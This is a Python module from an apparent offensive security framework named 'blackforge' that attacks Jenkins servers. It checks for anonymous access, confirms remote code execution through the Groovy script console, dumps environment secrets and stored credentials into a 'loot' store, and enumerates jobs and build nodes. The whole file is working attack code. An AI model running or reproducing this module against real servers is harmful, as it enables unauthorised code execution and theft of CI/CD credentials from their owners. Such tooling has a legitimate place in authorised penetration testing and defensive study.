"""Jenkins exploitation: anonymous access, Groovy RCE, credential dump,
job and node enumeration."""

from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple

from blackforge.logger import log
from blackforge.models import AttackResult, Credential, EngagementContext
from blackforge.modules.base import BaseModule
from blackforge.utils.http import request
from blackforge.utils.secrets import scan_secrets
from blackforge.data.payloads import JENKINS_GROOVY_PAYLOADS


class JenkinsModule(BaseModule):

    name = "jenkins"

    def run(self, ctx: EngagementContext, **kwargs: Any) -> List[AttackResult]:
        url: str = kwargs.get("url", "")
        username: str = kwargs.get("username", "")
        password: str = kwargs.get("password", "")
        token: str = kwargs.get("token", "")

        results: List[AttackResult] = []
        base = url.rstrip("/")
        ctx.loot.setdefault("jenkins", {})
        auth: Optional[Tuple[str, str]] = (username, password or token) if username else None

        results.extend(self._check_access(ctx, base, auth))
        results.extend(self._enum_jobs(ctx, base, auth))
        results.extend(self._groovy_rce(ctx, base, auth))
        results.extend(self._dump_credentials(ctx, base, auth))
        results.extend(self._enum_nodes(ctx, base, auth))
        return results

    def _get_crumb(self, ctx: EngagementContext, base: str,
                   auth: Optional[Tuple[str, str]]) -> Dict[str, str]:
        resp = request(ctx, "GET", f"{base}/crumbIssuer/api/json", auth=auth)
        if resp and resp.ok:
            data = resp.json()
            return {data["crumbRequestField"]: data["crumb"]}
        return {}

    def _check_access(self, ctx: EngagementContext, base: str,
                      auth: Optional[Tuple[str, str]]) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/api/json", auth=auth)
        if not resp:
            return [AttackResult("jenkins", "connect", "FAILED", target=base, notes="Cannot connect")]
        anon_resp = request(ctx, "GET", f"{base}/api/json")
        if anon_resp and anon_resp.ok:
            log(f"[Jenkins] ANONYMOUS ACCESS! {base}", "CRIT")
            ctx.loot["jenkins"]["anon_info"] = anon_resp.json()
            return [AttackResult(
                "jenkins", "anon_access", "SUCCESS", target=base,
                severity="CRITICAL",
                data={"version": resp.headers.get("X-Jenkins", "?")},
                notes=f"Jenkins at {base} allows anonymous access",
            )]
        if resp.ok:
            return [AttackResult("jenkins", "auth_access", "INFO", target=base,
                                 notes="Authenticated access granted")]
        return [AttackResult("jenkins", "access_denied", "FAILED", target=base,
                             notes=f"HTTP {resp.status_code}")]

    def _groovy_rce(self, ctx: EngagementContext, base: str,
                    auth: Optional[Tuple[str, str]]) -> List[AttackResult]:
        results: List[AttackResult] = []
        crumb = self._get_crumb(ctx, base, auth)
        hdrs = {**crumb, "Content-Type": "application/x-www-form-urlencoded"}

        resp = request(ctx, "POST", f"{base}/scriptText", auth=auth,
                       headers=hdrs, data={"script": JENKINS_GROOVY_PAYLOADS["whoami"]})
        if resp and resp.ok and resp.text.strip():
            output = resp.text.strip()
            log(f"[Jenkins] Groovy RCE! whoami={output}", "CRIT")
            ctx.loot["jenkins"]["rce"] = {"whoami": output}
            results.append(AttackResult(
                "jenkins", "groovy_rce", "SUCCESS", target=base,
                severity="CRITICAL", data={"whoami": output},
                notes=f"Groovy script console RCE confirmed. Running as: {output}.",
            ))
            env_resp = request(ctx, "POST", f"{base}/scriptText", auth=auth,
                               headers=hdrs, data={"script": JENKINS_GROOVY_PAYLOADS["env_dump"]})
            if env_resp and env_resp.ok:
                for s in scan_secrets(env_resp.text[:3000]):
                    log(f"[Jenkins] Secret in env: {s['type']}", "CRIT")
                    ctx.credentials.append(Credential(
                        s["type"], {"value": s["value"]},
                        f"jenkins:env:{base}", "From Jenkins environment variables",
                    ))
                ctx.loot["jenkins"]["env"] = env_resp.text[:1000]
        else:
            results.append(AttackResult(
                "jenkins", "groovy_rce", "FAILED", target=base,
                notes="Groovy script console not accessible or locked down",
            ))
        return results

    def _dump_credentials(self, ctx: EngagementContext, base: str,
                          auth: Optional[Tuple[str, str]]) -> List[AttackResult]:
        crumb = self._get_crumb(ctx, base, auth)
        hdrs = {**crumb, "Content-Type": "application/x-www-form-urlencoded"}

        resp = request(ctx, "POST", f"{base}/scriptText", auth=auth,
                       headers=hdrs, data={"script": JENKINS_GROOVY_PAYLOADS["cred_dump"]})
        if resp and resp.ok and resp.text.strip():
            cred_text = resp.text
            log(f"[Jenkins] Credential dump output:\n{cred_text[:300]}", "CRIT")
            ctx.loot["jenkins"]["credentials_dump"] = cred_text[:2000]
            for line in cred_text.split("\n"):
                if "PASS:" in line or "SECRET:" in line or "TOKEN:" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        ctx.credentials.append(Credential(
                            "jenkins_credential",
                            {"field": parts[0].strip(), "value": parts[1].strip()[:200]},
                            f"jenkins:credentials:{base}",
                        ))
            return [AttackResult(
                "jenkins", "cred_dump", "SUCCESS", target=base,
                severity="CRITICAL", data={"output": cred_text[:500]},
                notes=f"Jenkins credentials dumped via Groovy. {len(ctx.credentials)} extracted.",
            )]
        resp2 = request(ctx, "GET",
                        f"{base}/credentials/store/system/domain/_/api/json?depth=2",
                        auth=auth)
        if resp2 and resp2.ok:
            creds = resp2.json().get("credentials", [])
            return [AttackResult(
                "jenkins", "cred_api", "PARTIAL", target=base,
                data={"credentials": [c.get("id") for c in creds]},
                notes=f"{len(creds)} credentials found via API (values hidden).",
            )]
        return [AttackResult("jenkins", "cred_dump", "FAILED", target=base,
                             notes="Credentials not extractable")]

    def _enum_jobs(self, ctx: EngagementContext, base: str,
                   auth: Optional[Tuple[str, str]]) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/api/json?tree=jobs[name,url,buildable,color]", auth=auth)
        if not resp or not resp.ok:
            return []
        jobs = resp.json().get("jobs", [])
        ctx.loot["jenkins"]["jobs"] = [{"name": j["name"], "url": j.get("url", "")} for j in jobs]
        log(f"[Jenkins] {len(jobs)} jobs found", "INFO")
        return [AttackResult(
            "jenkins", "jobs_enum", "INFO", target=base,
            data={"count": len(jobs), "jobs": [j["name"] for j in jobs[:20]]},
            notes=f"{len(jobs)} Jenkins jobs.",
        )]

    def _enum_nodes(self, ctx: EngagementContext, base: str,
                    auth: Optional[Tuple[str, str]]) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/computer/api/json", auth=auth)
        if not resp or not resp.ok:
            return []
        computers = resp.json().get("computer", [])
        nodes = [{"name": c.get("displayName"), "offline": c.get("offline"),
                  "num_exec": c.get("numExecutors")} for c in computers]
        ctx.loot["jenkins"]["nodes"] = nodes
        return [AttackResult(
            "jenkins", "nodes_enum", "INFO", target=base,
            data={"count": len(nodes), "nodes": nodes},
            notes=f"{len(nodes)} Jenkins nodes.",
        )]
